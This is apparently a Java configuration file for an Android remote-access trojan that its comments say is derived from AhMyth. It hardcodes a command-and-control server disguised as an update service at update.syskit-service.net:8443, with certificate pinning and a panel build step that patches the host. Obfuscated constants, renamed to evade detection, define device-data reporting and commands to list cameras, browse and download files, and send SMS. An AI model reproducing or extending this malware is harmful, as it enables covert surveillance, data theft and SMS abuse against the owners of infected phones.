package com.piupiupiu;


public final class AppConfig {

    private AppConfig() {
    }


    // ===== C2 连接（保持明文：面板 Build 的 patchC2 靠明文 host/port 与折叠 URL 注入）=====
    public static final String C2_SCHEME = "https";
    public static final String C2_HOST = "update.syskit-service.net";
    public static final int C2_PORT = 8443;
    public static final String C2_PATH = "/sync";

    /** 客户端证书公钥固定（自签证书 SPKI 的 SHA-256）。Build 注入只改 host/port，pin 必须与面板内置证书一致。 */
    public static final String C2_PIN = "sha256/XLbHNEhBwnQo0kYZRgurNN9uqKsEKjnctV3DK9y2exI=";

    /**
     * 拼出完整 C2 基址，形如 https://host:port/sync
     */
    public static String c2Base() {
        return C2_SCHEME + "://" + C2_HOST + ":" + C2_PORT + C2_PATH;
    }

    // ---------------- 设备信息上报参数名（已加密，运行时还原为 d1..d4）----------------
    public static final String PARAM_MODEL = StrCodec.dec("FGE=");
    public static final String PARAM_VENDOR = StrCodec.dec("FGI=");
    public static final String PARAM_RELEASE = StrCodec.dec("FGM=");
    public static final String PARAM_DEVICE = StrCodec.dec("FGQ=");


    public static final String FRAME_TYPE = StrCodec.dec("BA==");
    public static final String FRAME_PAYLOAD = StrCodec.dec("CA==");

    // ---------------- 命令载荷字段名（已去 AhMyth 原字段名并加密）----------------
    public static final String FIELD_EXTRA = StrCodec.dec("HyA=");
    public static final String FIELD_PATH = StrCodec.dec("FiA=");
    public static final String FIELD_TO = StrCodec.dec("AjM=");
    public static final String FIELD_SMS = StrCodec.dec("EjQ=");
    public static final String FIELD_SEC = StrCodec.dec("FCVT");

    // ---------------- extra 取值 ----------------
    public static final String EXTRA_CAM_LIST = StrCodec.dec("EyY=");
    public static final String EXTRA_LS = StrCodec.dec("HCM=");
    public static final String EXTRA_DL = StrCodec.dec("FDw=");
    public static final String EXTRA_SEND_SMS = StrCodec.dec("BCg=");
}
